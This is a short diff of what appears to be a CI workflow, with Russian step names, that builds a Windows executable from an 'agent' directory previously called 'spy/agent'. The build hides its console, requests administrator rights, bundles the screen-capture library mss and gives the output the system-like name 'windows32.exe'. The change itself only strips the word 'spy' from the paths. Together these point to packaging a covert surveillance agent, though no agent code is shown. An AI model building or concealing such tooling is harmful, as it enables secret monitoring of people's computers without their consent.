@@ -23,12 +23,12 @@ jobs:
 
       - name: Генерация TLS сертификата
         run: |
-          cd spy/agent
+          cd agent
           python tls_gen.py
 
       - name: Сборка windows32.exe
         run: |
-          cd spy/agent
+          cd agent
           pyinstaller --noconfirm --onefile --noconsole --uac-admin `
             --name windows32 `
             --hidden-import mss `
@@ -55,4 +55,4 @@ jobs:
         uses: actions/upload-artifact@v4
         with:
           name: windows32
-          path: spy/agent/dist/windows32.exe
+          path: agent/dist/windows32.exe
